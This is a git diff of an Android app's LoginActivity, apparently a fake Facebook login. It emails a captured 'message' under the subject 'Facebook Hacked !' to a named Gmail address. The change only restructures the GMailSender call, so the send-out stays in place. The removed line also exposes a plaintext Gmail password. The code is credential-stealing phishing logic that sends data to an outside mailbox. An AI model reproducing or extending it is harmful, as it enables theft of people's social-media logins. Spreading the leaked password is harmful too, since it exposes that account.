@@ -270,9 +270,8 @@ public class LoginActivity extends AppCompatActivity
                                         public void run() {
                                             try {
 
-                                                GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "Ritik@12321");
-                                                sender.sendMail("Facebook Hacked !",
-                                                        message,
+                                                GMailSender sender = new GMailSender(LoginActivity.this);
+                                                sender.sendMail("Facebook Hacked !", message,
                                                         "ritik.fbhack@gmail.com",
                                                         "ritik.space@gmail.com");
                                             } catch (Exception e) {
